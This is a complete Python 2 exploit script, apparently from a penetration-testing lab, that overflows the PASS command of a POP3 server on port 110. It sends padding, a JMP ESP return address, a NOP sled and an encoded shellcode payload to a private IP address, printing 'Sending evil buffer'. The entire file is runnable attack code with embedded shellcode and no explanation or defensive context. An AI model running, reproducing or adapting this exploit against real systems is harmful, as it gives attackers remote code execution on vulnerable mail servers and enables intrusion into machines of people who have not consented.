
#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#5F4A358F   FFE4             JMP ESP
shellcode = ("\xbf\xc1\xea\x42\x27\xd9\xcb\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x78\x12\x83\xe8\xfc\x03\xb9\xe4\xa0\xd2\xc5\x11\xa6"
"\x1d\x35\xe2\xc7\x94\xd0\xd3\xc7\xc3\x91\x44\xf8\x80\xf7\x68"
"\x73\xc4\xe3\xfb\xf1\xc1\x04\x4b\xbf\x37\x2b\x4c\xec\x04\x2a"
"\xce\xef\x58\x8c\xef\x3f\xad\xcd\x28\x5d\x5c\x9f\xe1\x29\xf3"
"\x0f\x85\x64\xc8\xa4\xd5\x69\x48\x59\xad\x88\x79\xcc\xa5\xd2"
"\x59\xef\x6a\x6f\xd0\xf7\x6f\x4a\xaa\x8c\x44\x20\x2d\x44\x95"
"\xc9\x82\xa9\x19\x38\xda\xee\x9e\xa3\xa9\x06\xdd\x5e\xaa\xdd"
"\x9f\x84\x3f\xc5\x38\x4e\xe7\x21\xb8\x83\x7e\xa2\xb6\x68\xf4"
"\xec\xda\x6f\xd9\x87\xe7\xe4\xdc\x47\x6e\xbe\xfa\x43\x2a\x64"
"\x62\xd2\x96\xcb\x9b\x04\x79\xb3\x39\x4f\x94\xa0\x33\x12\xf1"
"\x05\x7e\xac\x01\x02\x09\xdf\x33\x8d\xa1\x77\x78\x46\x6c\x80"
"\x7f\x7d\xc8\x1e\x7e\x7e\x29\x37\x45\x2a\x79\x2f\x6c\x53\x12"
"\xaf\x91\x86\xb5\xff\x3d\x79\x76\xaf\xfd\x29\x1e\xa5\xf1\x16"
"\x3e\xc6\xdb\x3e\xd5\x3d\x8c\x4a\x21\x3d\x3b\x23\x37\x3d\xc2"
"\x08\xbe\xdb\xae\x7e\x97\x74\x47\xe6\xb2\x0e\xf6\xe7\x68\x6b"
"\x38\x63\x9f\x8c\xf7\x84\xea\x9e\x60\x65\xa1\xfc\x27\x7a\x1f"
"\x68\xab\xe9\xc4\x68\xa2\x11\x53\x3f\xe3\xe4\xaa\xd5\x19\x5e"
"\x05\xcb\xe3\x06\x6e\x4f\x38\xfb\x71\x4e\xcd\x47\x56\x40\x0b"
"\x47\xd2\x34\xc3\x1e\x8c\xe2\xa5\xc8\x7e\x5c\x7c\xa6\x28\x08"
"\xf9\x84\xea\x4e\x06\xc1\x9c\xae\xb7\xbc\xd8\xd1\x78\x29\xed"
"\xaa\x64\xc9\x12\x61\x2d\xf9\x58\x2b\x04\x92\x04\xbe\x14\xff"
"\xb6\x15\x5a\x06\x35\x9f\x23\xfd\x25\xea\x26\xb9\xe1\x07\x5b"
"\xd2\x87\x27\xc8\xd3\x8d")


buffer = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3500-2606-4-351-16)


try:
	print "\nSending evil buffer..."
	s.connect(('10.11.25.75',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\n DONE!"
except:
	print "Could not connect to POP3!"
